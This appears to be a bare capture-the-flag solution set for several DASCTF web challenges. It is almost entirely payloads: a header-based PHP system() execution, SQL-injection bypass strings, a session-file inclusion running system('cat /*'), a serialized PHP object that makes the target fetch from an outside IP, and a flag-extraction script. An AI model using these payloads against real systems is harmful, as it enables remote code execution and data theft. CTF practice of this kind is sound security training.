# NoRCE

```
?exp=system(array_key_last(array_flip(apache_request_headers())));

https://www.jianshu.com/p/5ac4602b14c6

2d70f515a6322718c277f20574870a3b
```



# EasyWeb

```
0e215962017
ffifdyop
```



# ezinclude

```php
http://71fcb111-9cb6-4392-95e4-0097d1cc9c21.machine.dasctf.com/?file=php://filter/convert.base64-decode/resource=/tmp/sess_44d426af94af4c78f64fbccf3cc11aa9

name=<?php system('cat /*');?>1111111111111111111111111111111111111111111111111111111111111111111
```



# GiveMeSecret

```php
<?php
class isFile{
    public $files = [];
    public function __construct(){
        $this->files[] = new readFile();
        //$this->files[] = "/var/www/html/waf.php";
    }
}
class readFile{
    //public $filepath = "data://text/plain,(\\sedac3hrolis<$?/.)";
    public $filepath = "http://118.31.168.198:39876/1.txt";

}
echo base64_encode(serialize(new isFile()));



```

```
http://110130b6-45e7-48e2-b779-bbbc8555f1d8.machine.dasctf.com/?a=Tzo2OiJpc0ZpbGUiOjE6e3M6NToiZmlsZXMiO2E6MTp7aTowO086ODoicmVhZEZpbGUiOjE6e3M6ODoiZmlsZXBhdGgiO3M6MzM6Imh0dHA6Ly8xMTguMzEuMTY4LjE5ODozOTg3Ni8xLnR4dCI7fX19&secret=1.15.0.8.3.5.4.14.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.16.19
```



# Safeegg

```python
import requests
url="http://49.232.75.70:28000/commit?startTime=1634962788&currentTime={}"

payload=1634962788
flag=""
while 1:
    payload+=50000
    s = chr(ord(requests.get(url=url.format(payload)).text)^0x8)
    flag+=s
    print(flag)

    "DASCTF{0e027f672f9f3af8ba4ce058155ee202}"
```

